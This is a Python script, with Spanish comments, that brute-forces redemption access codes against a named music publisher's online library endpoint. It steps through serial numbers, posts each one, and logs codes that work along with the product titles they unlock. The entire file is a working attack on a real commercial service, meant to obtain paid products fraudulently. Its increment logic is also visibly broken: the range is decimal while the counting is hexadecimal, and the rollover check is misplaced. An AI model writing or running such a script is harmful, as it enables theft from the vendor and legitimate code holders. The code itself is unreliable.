import requests
import time

# Rango de seriales a probar
start_serial = "0000-0000-0000-0000"
end_serial = "9999-9999-9999-9999"

# Archivos para guardar resultados
valid_serials_file = "valid_serials.txt"
invalid_serials_file = "invalid_serials.txt"

# Seriales ya probados
tried_serials = set()

# Función para probar un serial
def test_serial(serial):
    url = f"https://www.halleonard.com/mylibrary/product/redeem?accessCode={serial}"
    response = requests.post(url)
    data = response.json()
    
    if data["valid"]:
        if data["login_required"]:
            with open(valid_serials_file, "a") as f:
                f.write(f"{serial} ({data['display_title']})\n")
        else:
            with open(invalid_serials_file, "a") as f:
                f.write(f"{serial}\n")
    else:
        with open(invalid_serials_file, "a") as f:
            f.write(f"{serial}\n")

# Probar todos los seriales
current_serial = start_serial
while current_serial <= end_serial:
    if current_serial not in tried_serials:
        test_serial(current_serial)
        tried_serials.add(current_serial)
        time.sleep(0.5)  # Esperar 0.5 segundos entre cada prueba
    
    # Incrementar el serial
    parts = current_serial.split("-")
    last_part = int(parts[-1], 16) + 1
    parts[-1] = f"{last_part:04X}"
    current_serial = "-".join(parts)
    if last_part > 0xFFFF:
        last_part = 0x0000
        parts[-2] = f"{int(parts[-2], 16) + 1:04X}"
        if int(parts[-2], 16) > 0xFFFF:
            parts[-3] = f"{int(parts[-3], 16) + 1:04X}"
            parts[-2] = "0000"
        parts[-1] = f"{last_part:04X}"
        current_serial = "-".join(parts)
